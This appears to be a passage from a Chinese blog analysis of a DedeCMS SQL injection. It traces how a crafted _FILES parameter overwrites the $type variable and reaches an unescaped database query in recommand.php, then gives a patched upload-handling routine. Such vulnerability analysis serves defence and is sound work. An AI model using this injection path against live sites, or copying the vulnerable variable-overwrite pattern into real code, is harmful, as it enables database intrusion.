<pre class="prettyprint cs" style="padding:0.3em; font-family:Monaco,Menlo,Consolas,'Courier New',monospace; color:rgb(51,51,51); margin-top:0px; margin-bottom:1.5em; line-height:1.5em; word-break:break-all; word-wrap:break-word; white-space:pre-wrap; overflow-y:auto; background-color:rgb(246,246,246)">http:<span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">//</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">www.xuebuyuan.com/2095280.html</span></span><span style="color:rgb(0,128,0)"></span>
http:<span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">//</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">0day5.com/archives/1346</span></span><span style="color:rgb(0,128,0)"></span>
http:<span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">//</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">loudong.360.cn/blog/view/id/17</span></span><span style="color:rgb(0,128,0)"></span></pre> 
<div style="font-size:16px; line-height:27.2px; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> 
 <p style="margin-top:0px; margin-bottom:0.75em; line-height:1.7em; text-indent:1em"> 3. 漏洞影响范围</p> 
 <p style="margin-top:0px; margin-bottom:0.75em; line-height:1.7em; text-indent:1em"> 4. 漏洞代码分析</p> 
</div> 
<p style="margin-top:0px; margin-bottom:0.75em; font-size:16px; line-height:27.2px; text-indent:1em; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> 从/plus/recommand.php开始逐步分析</p> 
<pre><code class="language-php"><span class="keyword" style="font-weight:bold">require_once</span>(dirname(__FILE__).<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">/../include/common.inc.php</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">);
..</span></code></pre> 
<p style="margin-top:0px; margin-bottom:0.75em; font-size:16px; line-height:27.2px; text-indent:1em; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> /include/common.inc.php</p> 
<pre><code class="language-php"><span style="color:rgb(0,0,0)">..
<span class="function"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">function</span> <span class="title" style="color:rgb(153,0,0); font-weight:bold">_RunMagicQuotes</span><span class="params">(</span></span></span><span class="function"><span class="params">&amp;<span style="color:rgb(0,0,0)"><span class="variable" style="color:rgb(0,128,128)">$svar</span>)</span></span><span style="color:rgb(0,0,0)">
{<!-- --></span></span><span style="color:rgb(0,0,0)">
<span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>(!<span style="color:rgb(0,0,0)">get_magic_quotes_gpc())
<span class="indent">  </span>{
<span class="indent">  </span><span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span><span style="color:rgb(0,0,0)">( is_array(<span class="variable" style="color:rgb(0,128,128)">$svar</span>) )
<span class="indent">  </span><span class="indent">  </span>{
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">foreach</span></span>(<span class="variable" style="color:rgb(0,128,128)">$svar</span> <span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">as</span></span> <span class="variable" style="color:rgb(0,128,128)">$_k</span> =&gt; <span class="variable" style="color:rgb(0,128,128)">$_v</span>) <span class="variable" style="color:rgb(0,128,128)">$svar</span>[<span class="variable" style="color:rgb(0,128,128)">$_k</span>] =<span style="color:rgb(0,0,0)"> _RunMagicQuotes(<span class="variable" style="color:rgb(0,128,128)">$_v</span>);
<span class="indent">  </span><span class="indent">  </span>}
<span class="indent">  </span><span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">else</span></span><span style="color:rgb(0,0,0)">
<span class="indent">  </span><span class="indent">  </span>{
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>( strlen(<span class="variable" style="color:rgb(0,128,128)">$svar</span>)&gt;<span style="color:rgb(128,0,128)"><span class="number" style="color:rgb(0,153,153)">0</span></span> &amp;&amp; preg_match(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">#^(cfg_|GLOBALS|_GET|_POST|_COOKIE)#</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">,<span class="variable" style="color:rgb(0,128,128)">$svar</span>) )
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span>{
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span>  <span class="keyword" style="color:rgb(51,51,51); font-weight:bold">exit</span>(</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">Request var not allow!</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">);
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span>}
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span><span class="variable" style="color:rgb(0,128,128)">$svar</span> </span>=<span style="color:rgb(0,0,0)"> addslashes(<span class="variable" style="color:rgb(0,128,128)">$svar</span>);
<span class="indent">  </span><span class="indent">  </span>}
<span class="indent">  </span>}
<span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">return</span></span><span style="color:rgb(0,0,0)"> <span class="variable" style="color:rgb(0,128,128)">$svar</span>;
}
..</span>
</code></pre> 
<p style="margin-top:0px; margin-bottom:0.75em; font-size:16px; line-height:27.2px; text-indent:1em; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> 只要提交的URL中不包含cfg_|GLOBALS|_GET|_POST|_COOKIE，即可通过检查，_FILES[type][tmp_name]被带入引发漏洞的入口点在/include/uploadsafe.inc.php</p> 
<pre><code class="language-php"><span style="color:rgb(0,0,0)">..
</span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">//</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">转换上传的文件相关的变量及安全处理、并引用前台通用的上传函数</span></span><span style="color:rgb(0,128,0)"></span>
<span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span><span style="color:rgb(0,0,0)">(<span class="variable" style="color:rgb(0,128,128)">$_FILES</span>)
{
    <span class="keyword" style="color:rgb(51,51,51); font-weight:bold">require_once</span>(DEDEINC.</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">/uploadsafe.inc.php</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">);
}
..</span></code></pre> 
<p style="margin-top:0px; margin-bottom:0.75em; font-size:16px; line-height:27.2px; text-indent:1em; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> /include/uploadsafe.inc.php</p> 
<pre><code class="language-ruby"><span style="color:rgb(0,0,0)">..
</span><span style="color:rgb(0,128,0)"><span class="regexp" style="color:rgb(0,153,38)">//</span></span><span style="color:rgb(0,128,0)"><span class="constant">URL</span>参数中的_FILES[type][tmp_name]，<span class="variable" style="color:rgb(0,128,128)">$_key</span>为type，<span class="variable" style="color:rgb(0,128,128)">$$</span>_key即为<span class="variable" style="color:rgb(0,128,128)">$type</span>，从而导致了<span class="variable" style="color:rgb(0,128,128)">$type</span>变量的覆盖</span>
<span class="variable" style="color:rgb(0,128,128)">$$</span>_key = <span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">tmp_name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>] = str_replace(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">\\\\</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>,<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">\\</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>,<span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">tmp_name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">]);
<span class="variable" style="color:rgb(0,128,128)">${<!-- --></span><span class="variable" style="color:rgb(0,128,128)">$_key</span>.</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>} = <span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">];
<span class="variable" style="color:rgb(0,128,128)">${<!-- --></span><span class="variable" style="color:rgb(0,128,128)">$_key</span>.</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_type</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>} = <span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">type</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>] = eregi_replace(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">[^0-9a-z\./]</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>,<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">''</span></span>,<span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">type</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">]);
<span class="variable" style="color:rgb(0,128,128)">${<!-- --></span><span class="variable" style="color:rgb(0,128,128)">$_key</span>.</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_size</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>} = <span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">size</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>] = ereg_replace(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">[^0-9]</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>,<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">''</span></span>,<span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">size</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">]);
..</span></code></pre> 
<p style="margin-top:0px; margin-bottom:0.75em; font-size:16px; line-height:27.2px; text-indent:1em; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> /plus/recommand.php</p> 
<pre><code class="language-php"><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">//</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">读取文档信息</span></span><span style="color:rgb(0,128,0)"></span>
<span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>(<span class="variable" style="color:rgb(0,128,128)">$action</span>==<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">''</span></span><span style="color:rgb(0,0,0)">)
{
<span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>(<span class="variable" style="color:rgb(0,128,128)">$type</span>==<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">sys</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">){
<span class="indent">  </span></span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">//</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">读取文档信息</span></span><span style="color:rgb(0,128,0)"></span>
<span class="indent">  </span><span class="indent">  </span><span class="variable" style="color:rgb(0,128,128)">$arcRow</span> =<span style="color:rgb(0,0,0)"> GetOneArchive(<span class="variable" style="color:rgb(0,128,128)">$aid</span>);
<span class="indent">  </span><span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>(<span class="variable" style="color:rgb(0,128,128)">$arcRow</span>[<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">aid</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>]==<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">''</span></span><span style="color:rgb(0,0,0)">) 
<span class="indent">  </span><span class="indent">  </span>{
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span>ShowMsg(</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">无法把未知文档推荐给好友!</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>,<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">-1</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">);
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">exit</span>();
<span class="indent">  </span><span class="indent">  </span>}
<span class="indent">  </span><span class="indent">  </span>extract(<span class="variable" style="color:rgb(0,128,128)">$arcRow</span>, EXTR_OVERWRITE);
<span class="indent">  </span>} 
<span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">else</span></span><span style="color:rgb(0,0,0)"> 
<span class="indent">  </span>{
<span class="indent">  </span><span class="indent">  </span></span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">//</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">注入语句被带入数据库查询，</span></span><span style="color:rgb(0,128,0)"></span>
<span class="indent">  </span><span class="indent">  </span><span class="variable" style="color:rgb(0,128,128)">$arcRow</span>=<span class="variable" style="color:rgb(0,128,128)">$dsql</span>-&gt;GetOne(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">SELECT s.*,t.* FROM `#@__member_stow` AS s LEFT JOIN `#@__member_stowtype` AS t ON s.type=t.stowname WHERE s.aid='$aid' AND s.type='$type'</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">);
<span class="indent">  </span><span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>(!<span style="color:rgb(0,0,0)">is_array(<span class="variable" style="color:rgb(0,128,128)">$arcRow</span>)){
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span>ShowMsg(</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">无法把未知文档推荐给好友!</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>,<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">-1</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">);
<span class="indent">  </span><span class="indent">  </span><span class="indent">  </span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">exit</span>();
<span class="indent">  </span><span class="indent">  </span>}
<span class="indent">  </span><span class="indent">  </span><span class="variable" style="color:rgb(0,128,128)">$arcRow</span>[</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">arcurl</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>]=<span class="variable" style="color:rgb(0,128,128)">$arcRow</span>[<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">indexurl</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>].<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">=</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>.<span class="variable" style="color:rgb(0,128,128)">$arcRow</span>[<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">aid</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">];
<span class="indent">  </span><span class="indent">  </span>extract(<span class="variable" style="color:rgb(0,128,128)">$arcRow</span>, EXTR_OVERWRITE);
<span class="indent">  </span>}
}</span>
</code></pre> 
<p style="margin-top:0px; margin-bottom:0.75em; font-size:16px; line-height:27.2px; text-indent:1em; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> 5. 防御方法</p> 
<p style="margin-top:0px; margin-bottom:0.75em; font-size:16px; line-height:27.2px; text-indent:1em; color:rgb(51,51,51); font-family:'Helvetica Neue',Helvetica,Tahoma,Arial,STXihei,'Microsoft YaHei',微软雅黑,sans-serif; background-color:rgb(254,254,254)"> /include/uploadsafe.inc.php</p> 
<pre><code class="language-php"><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">/*</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic">  <span style="color:rgb(0,128,0)">*/</span></span><span style="color:rgb(0,128,0)"></span>
<span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">//</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)">$$_key = $_FILES[$_key]['tmp_name'] = str_replace("\\\\","\\",$_FILES[$_key]['tmp_name']);</span></span><span style="color:rgb(0,128,0)"></span>
<span class="variable" style="color:rgb(0,128,128)">$$_key</span> = <span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">tmp_name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">];
</span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">/*</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"> <span style="color:rgb(0,128,0)">*/</span></span><span style="color:rgb(0,128,0)"></span><span style="color:rgb(0,0,0)">
${<!-- --><span class="variable" style="color:rgb(0,128,128)">$_key</span>.</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>} = <span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">];
${<!-- --><span class="variable" style="color:rgb(0,128,128)">$_key</span>.</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_type</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>} = <span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">type</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>] = preg_replace(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">#[^0-9a-z\./]#i</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>, <span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">''</span></span>, <span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">type</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">]);
${<!-- --><span class="variable" style="color:rgb(0,128,128)">$_key</span>.</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_size</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>} = <span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">size</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>] = preg_replace(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">#[^0-9]#</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>,<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">''</span></span>,<span class="variable" style="color:rgb(0,128,128)">$_FILES</span>[<span class="variable" style="color:rgb(0,128,128)">$_key</span>][<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">size</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">]);
</span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>(!<span class="keyword" style="font-weight:bold">empty</span>(${<!-- --><span class="variable" style="color:rgb(0,128,128)">$_key</span>.<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>}) &amp;&amp; (preg_match(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">#\.(</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>.<span class="variable" style="color:rgb(0,128,128)">$cfg_not_allowall</span>.<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">)$#i</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>,${<!-- --><span class="variable" style="color:rgb(0,128,128)">$_key</span>.<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>}) || !preg_match(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">#\.#</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>, ${<!-- --><span class="variable" style="color:rgb(0,128,128)">$_key</span>.<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_name</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">})) )
{
<span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>(!defined(<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">DEDEADMIN</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">))
<span class="indent">  </span>{
<span class="indent">  </span><span class="indent">  </span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">exit</span>(</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">Not Admin Upload filetype not allow !</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">);
<span class="indent">  </span>}
}
